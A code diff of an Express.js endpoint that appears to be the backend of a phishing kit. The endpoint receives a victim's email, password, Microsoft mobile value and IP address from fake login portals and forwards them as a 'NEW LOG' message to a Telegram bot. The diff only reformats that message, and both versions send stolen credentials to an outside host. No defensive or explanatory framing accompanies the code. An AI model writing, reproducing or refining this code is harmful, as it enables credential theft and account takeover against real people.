@@ -9,15 +9,20 @@ const BOT_TOKEN = process.env.BOT_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
 
 app.post('/submit', async (req, res) => {
-    const data = req.body;
-    
-    let message = "🚨 **NEW LOG CAPTURED** 🚨\n\n";
-    message += "**Portal:** " + (data.page || 'General') + "\n";
-    message += "**Type:** " + (data.type || 'N/A') + "\n";
-    message += "**Email:** " + (data.email || 'N/A') + "\n";
-    message += "**Pwd:** " + (data.pwd || 'N/A') + "\n";
-    message += "**Ms Mobile:** " + (data.msMobile || 'N/A') + "\n\n";
-    message += "**IP:** " + (req.headers['x-forwarded-for'] || req.socket.remoteAddress);
+    const message = `
+🚀 NEW LOG ARRIVED 🚀
+━━━━━━━━━━━━━━━━━━
+📂 Portal: ${req.body.page || 'Unknown'}
+Label: \`${req.body.type}\`
+
+📧 Email: \`${req.body.email}\`
+🔑 Password: \`${req.body.pwd}\`
+📱 Mobile: \`${req.body['ms-mobile']}\`
+
+🌐 IP Address: ${req.headers['x-forwarded-for'] || req.socket.remoteAddress}
+━━━━━━━━━━━━━━━━━━
+⏰ *Captured at: ${new Date().toLocaleString()}*
+`;
 
     try {
         await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
